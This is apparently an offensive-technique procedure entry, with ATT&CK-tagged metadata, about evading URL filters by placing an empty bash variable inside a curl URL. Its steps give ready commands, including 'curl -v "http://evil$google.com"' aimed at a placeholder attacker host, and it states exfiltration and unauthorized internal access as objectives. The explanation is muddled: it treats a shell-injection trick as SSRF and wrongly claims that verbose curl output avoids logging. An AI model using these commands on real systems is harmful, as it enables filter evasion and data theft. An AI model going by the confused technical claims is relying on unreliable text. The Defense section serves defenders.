---
id: ea9d81b8-25ce-4e72-ad1f-cae24499d92e
name: Bypass-SSRF-Filters-Using-Bash-Variables-and-Curl-Verbose
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.512145+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Indicator Removal on Host|T1070 - Indicator Removal on Host]]'
  - '[[techniques/Web Service|T1102 - Web Service]]'
sub_techniques: []
tags:
  - '[[tags/Bypassing filters]]'
  - '[[tags/Bypass using bash variables]]'
  - '[[tags/Server-Side Request Forgery]]'
commands:
  - '[[commands/bash-assign-empty-variable]]'
  - '[[commands/curl-verbose-with-variable-url]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# Bypass-SSRF-Filters-Using-Bash-Variables-and-Curl-Verbose

## Summary

This procedure demonstrates how to bypass URL filters in a Server-Side Request Forgery (SSRF) attack by embedding a bash variable in the URL string within a curl command. By setting the variable to an empty string, the URL expands to a filtered domain (e.g., 'evil.com') without directly matching the blocked pattern, allowing access to restricted resources while using verbose output for detailed inspection.

## Description

In an SSRF scenario, applications may filter outgoing requests to prevent access to internal or sensitive endpoints like 'evil.com'. This technique exploits bash variable expansion to obfuscate the URL: constructing it as 'http://evil$google.com' where $google is empty results in 'http://evil.com' after expansion, evading string-based filters that scan for exact matches. The -v flag enables verbose mode in curl, revealing headers, status codes, and connection details for debugging and confirming access. This is useful in red team engagements to probe internal networks or exfiltrate data via SSRF vulnerabilities in web applications. The target environment typically involves a vulnerable web app that makes server-side HTTP requests based on user input, running on Linux/Unix systems with bash and curl available.

## Requirements

1. Access to a Linux/Unix shell environment where the SSRF payload will be injected (e.g., via RCE or command injection in the vulnerable app).
2. Curl installed on the target system (standard on most Linux distributions).
3. Basic knowledge of bash variable expansion and SSRF attack vectors.
4. A vulnerable application endpoint that accepts and executes user-supplied URLs for server-side requests.

## Defense

- Implement strict input validation and whitelisting for URLs in SSRF-prone endpoints to block variable expansions and obfuscated payloads.
- Monitor network traffic for unusual curl invocations or verbose HTTP requests to internal/blocked domains.
- Use web application firewalls (WAFs) to detect anomalous request patterns, such as embedded shell variables in URLs.
- Enable logging of all outgoing HTTP requests from the application server and scan for signs of command injection or SSRF attempts.

## Objectives

1. Obfuscate blocked URLs using bash variables to bypass content filters in SSRF attacks.
2. Use curl's verbose output to inspect request/response details without alerting basic logging.
3. Gain unauthorized access to internal resources or sensitive data via the bypassed request.
4. Collect reconnaissance information on the target system for further exploitation.

## Instructions

### Step 1: Assign an Empty String to a Bash Variable

**Context**: Create a bash variable set to an empty string. This variable will be embedded in the URL to allow expansion that hides the full domain from filters. For example, setting 'google' to empty ensures 'evil$google.com' becomes 'evil.com' without matching direct blocks on 'evil.com'.

**Command** ([[commands/bash-assign-empty-variable]]):
```bash
google=""
```

> This command defines the variable without outputting anything visible. It prepares the environment for URL obfuscation. Verify the variable is set by running 'echo $google', which should return nothing.

### Step 2: Execute Curl Request with Embedded Variable and Verbose Output

**Context**: Use curl to send an HTTP request to the obfuscated URL via the SSRF endpoint. The variable expands during execution, bypassing filters, while -v provides detailed headers and status for analysis. Inject this command into the vulnerable application parameter that triggers the server-side request.

**Command** ([[commands/curl-verbose-with-variable-url]]):
```bash
curl -v "http://evil$google.com"
```

> The URL expands to 'http://evil.com' due to the empty $google. Expected output includes verbose details like connection establishment, request headers sent, response status (e.g., 200 OK if successful), and full response body. Look for successful connection indicators such as 'HTTP/1.1 200 OK' and any retrieved content from the target domain. If the filter is bypassed, you should receive data from the restricted resource; otherwise, expect a connection error or filtered rejection.
